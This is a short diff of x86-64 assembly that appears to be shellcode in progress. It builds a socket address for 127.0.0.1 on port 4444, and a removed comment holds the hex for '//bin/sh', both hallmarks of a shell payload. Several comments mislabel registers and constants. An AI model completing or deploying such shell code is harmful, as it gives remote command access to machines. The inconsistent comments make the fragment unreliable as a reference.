@@ -32,9 +32,10 @@ main:
         mov rsi, message                        ; Have RDI point to that message buffer
         mov rdx, 0x5                            ; AF_INET
 
-        push 0x00
-        push qword 0xaaaaaaaaa
-       ;push 0x0x68732f6e69622f2f
+       push 0x0100007F
+       push word 0x5c11                        ; Port (4444)
+       push word 2                             ; Address family -
+       
         mov r8, rsp
         mov r9, 16
         syscall
